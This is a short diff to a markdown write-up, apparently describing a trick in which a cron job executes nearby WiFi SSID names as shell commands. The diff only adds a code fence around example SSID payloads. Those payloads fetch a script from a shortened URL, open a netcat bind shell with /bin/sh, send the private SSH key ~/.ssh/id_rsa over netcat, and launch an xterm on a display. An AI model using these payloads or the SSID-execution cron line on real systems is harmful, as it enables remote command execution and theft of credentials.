@@ -15,11 +15,16 @@ echo "*/1 * * * * bash -c \"$(nmcli -f SSID dev wifi list | cut -f2 -d\' | egrep
 ```
 
 Now you can execute remote commands with your hotspot, create SSID names such as:
+
+```shell-session
+
 >curl -sL bit.ly/getouch
 >nc -e /bin/sh -l 2222
 >nc 127.0.0.1 20 < ~/.ssh/id_rsa
 >xterm -display 127.0.0.1:1 &
 (...)
+
+```
 
 
 **refs**
